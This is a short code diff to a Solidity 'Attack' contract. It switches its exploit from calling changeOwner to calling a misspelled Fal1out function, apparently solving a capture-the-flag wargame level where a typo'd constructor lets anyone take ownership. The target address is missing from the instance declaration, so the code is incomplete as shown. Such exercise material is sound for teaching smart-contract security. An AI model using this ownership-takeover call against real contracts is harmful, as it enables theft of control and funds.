@@ -2,13 +2,13 @@
 pragma solidity ^0.8.20;
 
 interface Instance {
-    function changeOwner(address) external;
+  function Fal1out() external payable;
 }
 
 contract Attack {
     Instance instance = Instance();
 
     constructor() {
-        instance.changeOwner(msg.sender);
+        instance.Fal1out();
     }
 }
